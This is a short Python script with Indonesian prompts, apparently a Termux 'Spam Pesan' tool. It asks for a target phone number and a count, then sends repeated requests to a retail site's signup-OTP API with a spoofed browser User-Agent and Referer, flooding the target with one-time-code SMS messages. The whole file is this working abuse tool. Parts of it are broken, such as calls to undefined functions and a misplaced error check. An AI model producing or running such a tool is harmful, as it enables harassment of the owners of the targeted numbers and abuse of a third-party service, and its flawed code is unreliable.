#!/bin/python

#module
import json
import requests
import sys
import os

# nanya
def nanya():
         nanya =raw_input("\033[34;1mApakah \033[32;1m anda \033[35;1m ingin \033[36;1matack lagi? \033[36;1m[\033[32;1mY\033[34;1m/\033[35;1mT\033[33;1m] \033[35;1m~\033[33;1m=> ")
         if nanya =="Y" or nanya =="y":
                menu()
         elif nanya =="T" or nanya =="t":
                auto("\033[35;1mBye \033[32;1mBye :)")
                time.sleep(1)
                sys.exit()
         elif nanya =="" or nanya =='':
                auto("\033[32;1mJangan \033[35;1msampe \033[36;1mkosong \033[32;1mya")
                time.sleep(1)
                nanya()
         else:
                auto("\033[32;1mSalah, \033[35;1mMasukkan \033[36;1minput \033[32;1mpilihan \033[36;1mdengan \033[33;1mbenar!")
                time.sleep(1)
                nanya()

# menu

def menu():
        os.system('clear')
        os.system('figlet Spam Pesan')
        banner = '''
\033[34;1m\033[32;1m=======================================
\033[32;1m=    \033[35;1m(+)Author    : \033[36;1mReza Alfauzan     =
\033[35;1m=    \033[36;1m(+)Youtube   : \033[33;1mReja Gaming       =
\033[36;1m=    \033[33;1m(+)Facebook  : \033[36;1mRzaa Ajaa         =
\033[32;1m=    \033[35;1m(+)Pesan     : \033[36;1mJangan Recode Ya  =
\033[35;1m=    \033[36;1m(+)Pesan     : \033[33;1mGua Masih Noob    =
\033[34;1m\033[32;1m=======================================
\033[32;1m====> \033[35;1mCoded \033[36;1mBy \033[36;1mReza \033[33;1m<====
> \033[36;1mWelcome To Termux <
\033[35;1m====> \033[36;1mGua \033[35;1mGanteng:v \033[36;1m<====
'''

        print(banner)
        no = input('\033[39;1mNomor \033[36;1mTarget \033[33;1m==> : ')
        jum = input('\033[36;1mJumlah \033[33;1mSpam \033[35;1m==> :')

        head = {
        "User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36",
        "Referer": "https://www.mapclub.com/en/user/signup",
        "Host": "cmsapi.mapclub.com",
        }
        
        dat = {
        'phone' : no
        }
        
        
        for x in range(int(jum)):
                leosureo =requests.post("https://cmsapi.mapclub.com/api/signup-otp", headers=head, json=dat)
        if 'error' in leosureo:
                print('Gagal Mengirimn:)' + no)
        else:
                print('\033[35;1mBerhasil \033[33;1mMengirim :' + no)
        nanya()
menu()
